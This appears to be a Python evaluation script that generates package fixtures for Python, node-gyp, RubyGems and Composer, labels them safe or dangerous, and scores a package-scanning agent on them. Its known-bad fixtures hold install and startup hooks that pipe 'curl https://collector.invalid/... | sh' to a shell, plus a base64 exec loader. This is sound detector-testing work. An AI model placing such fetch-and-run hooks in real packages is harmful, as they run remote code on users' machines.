#!/usr/bin/env python3
"""Source-derived package startup/build/install surfaces with benign twins."""

from __future__ import annotations

import argparse
import json
import tempfile
from pathlib import Path

import local_eval


CASES = (
    ("known-bad", "pth-direct-startup-shell", {
        "pyproject.toml": '[project]\nname = "startup-loader"\n',
        "startup_loader.pth": (
            "import os; os.system('curl https://collector.invalid/bootstrap | sh')\n"
        ),
    }, [("import_side_effect", "startup_loader.pth")]),
    ("known-good", "pth-path-extension", {
        "pyproject.toml": '[project]\nname = "vendor-paths"\n',
        "vendor_paths.pth": "vendor\n",
        "vendor/helpers.py": "def identity(value): return value\n",
    }, []),
    ("known-bad", "pth-imported-startup-payload", {
        "pyproject.toml": '[project]\nname = "startup-bootstrap"\n',
        "startup_bootstrap.pth": "import bootstrap\n",
        "bootstrap.py": (
            "import base64\n"
            "payload = base64.b64decode('cHJpbnQoJ3B3bmVkJyk=')\n"
            "exec(payload)\n"
        ),
    }, [("import_side_effect", "bootstrap.py")]),
    ("known-good", "pth-safe-compat-import", {
        "pyproject.toml": '[project]\nname = "compat-bootstrap"\n',
        "compat_bootstrap.pth": "import compat_bootstrap\n",
        "compat_bootstrap.py": "ENABLED = True\n",
    }, []),
    ("known-bad", "implicit-node-gyp-action", {
        "package.json": json.dumps({"name": "native-helper", "version": "1.0.0"}),
        "binding.gyp": (
            "{'targets':[{'target_name':'helper','actions':[{'action_name':'bootstrap',"
            "'inputs':[],'outputs':['stamp'],'action':['sh','-c',"
            "'curl https://collector.invalid/native | sh']}]}]}\n"
        ),
    }, [("install_hook_exec", "binding.gyp")]),
    ("known-good", "disabled-node-gyp-action", {
        "package.json": json.dumps({
            "name": "vendored-native-config", "version": "1.0.0", "gypfile": False,
        }),
        "binding.gyp": (
            "{'targets':[{'target_name':'fixture','actions':[{'action_name':'unused',"
            "'inputs':[],'outputs':['stamp'],'action':['sh','-c',"
            "'curl https://fixture.invalid/native | sh']}]}]}\n"
        ),
    }, []),
    ("known-bad", "rubygems-install-hook-shell", {
        "loader.gemspec": (
            "Gem::Specification.new do |s|\n  s.name='loader'\n  s.version='1.0.0'\nend\n"
        ),
        "rubygems_plugin.rb": (
            "Gem.pre_install do |_installer|\n"
            "  system('curl https://collector.invalid/gem | sh')\n"
            "end\n"
        ),
    }, [("install_hook_exec", "rubygems_plugin.rb")]),
    ("known-good", "rubygems-safe-plugin-hook", {
        "audit.gemspec": (
            "Gem::Specification.new do |s|\n  s.name='audit'\n  s.version='1.0.0'\nend\n"
        ),
        "rubygems_plugin.rb": (
            "Gem.post_install do |installer|\n"
            "  warn \"installed #{installer.spec.full_name}\"\n"
            "end\n"
        ),
    }, []),
    ("known-bad", "composer-post-autoload-shell", {
        "composer.json": json.dumps({
            "name": "example/bootstrap",
            "scripts": {
                "post-autoload-dump": "curl https://collector.invalid/php | sh",
            },
        }),
    }, [("install_hook_exec", "composer.json")]),
    ("known-good", "composer-post-autoload-local", {
        "composer.json": json.dumps({
            "name": "example/cache-builder",
            "scripts": {"post-autoload-dump": "@php bin/build-cache.php"},
        }),
        "bin/build-cache.php": "<?php file_put_contents('cache.php', '<?php return [];');\n",
    }, []),
)


def materialise(root: Path) -> None:
    for label, name, files, findings in CASES:
        artifact = root / "packages" / label / name
        artifact.mkdir(parents=True)
        for rel, body in files.items():
            path = artifact / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(body, encoding="utf-8")
        expected = [{
            "category": category,
            "severity": "CRIT",
            "plane": "action",
            "title": category.replace("_", " "),
            "evidence_ref": ref,
        } for category, ref in findings]
        (artifact / "label.json").write_text(json.dumps({
            "artifact_id": f"packages/{label}/{name}",
            "track": "packages",
            "ground_truth": {
                "verdict": "ALLOW" if label == "known-good" else "WARN",
                "classification": "safe" if label == "known-good" else "dangerous",
            },
            "expected_findings": expected,
        }), encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--agent", default="build/phylax_packages_agent.py")
    args = parser.parse_args()
    agent = Path(args.agent)
    if not agent.is_absolute():
        agent = local_eval.LAB / agent
    with tempfile.TemporaryDirectory(prefix="phylax-packages-wave10-src-") as src_tmp:
        with tempfile.TemporaryDirectory(prefix="phylax-packages-wave10-work-") as work_tmp:
            src, work = Path(src_tmp), Path(work_tmp)
            materialise(src)
            corpus = local_eval.load_corpus(src, "packages", work)
            score, rows, detail = local_eval.score_detonation_track(
                agent, corpus, "packages", "packages-wave10-source-levers", 1, 60, False,
            )
            print(f"packages-wave10-source-levers: score={score:.4f}  {detail}")
            for ref, verdict, note in rows:
                print(f"  {ref:<72} {verdict:<6} {note}")
            return 0 if score >= 0.9999 else 1


if __name__ == "__main__":
    raise SystemExit(main())
